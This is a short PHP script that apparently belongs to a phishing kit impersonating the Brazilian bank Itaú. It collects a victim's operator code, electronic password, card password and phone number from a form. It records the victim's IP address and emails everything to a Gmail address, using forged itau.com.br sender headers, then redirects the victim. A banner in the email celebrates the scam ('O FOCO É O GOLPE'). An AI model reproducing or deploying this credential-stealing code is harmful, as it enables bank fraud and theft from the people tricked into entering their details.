﻿<?php

$operador = $_POST['operador'];
$senha1 = $_POST['senha1'];
$senha2 = $_POST['senha2'];
$telefone = $_POST['telefone'];

$_SESSION["operador"] = $operador;
$_SESSION["senha1"] = $senha1;
$_SESSION["senha2"] = $senha2;
$_SESSION["telefone"] = $telefone;

$ip = $_SERVER['REMOTE_ADDR'];


$emaildestinatario = 'aprovacao300@gmail.com';

$subj = "Dados / IP: $ip - Chegou: ITA JUJU by G4ll0";

/* Montando a mensagem a ser enviada no corpo do e-mail. */
$mensagemHTML = '
<p>------------- |Chegou ita JUJU by G4ll0| ------------</p>
<p><b>Código do Operador:</b> '.$operador.'<br>
<br>
<p><b>Senha eletronica:</b> '.$senha1.'<br>
<p><b>Senha do cartão:</b> '.$senha2.'<br>
<p><b>Telefone:</b> '.$telefone.'<br>
<hr>
<p>------------ |O FOCO É O GOLPE| ------------</p>
';

$headers = "MIME-Version: 1.1\r\n";
$headers .= "Content-type: text/html; charset=utf-8\r\n";
$headers .= "From: empresa@itau.com.br \r\n"; // remetente
$headers .= "Return-Path: empresa@itau.com.br \r\n"; // return-path
$envio = mail("aprovacao300@gmail.com", $subj, $mensagemHTML, $headers); 

	if($envio){
		echo "<script>location='../fim.php';</script>";
	}else{ 
  		echo "<script>alert('Desculpe, algo deu errado. Tente novamente !');location='../home.php';</script>"; 
  	}
?>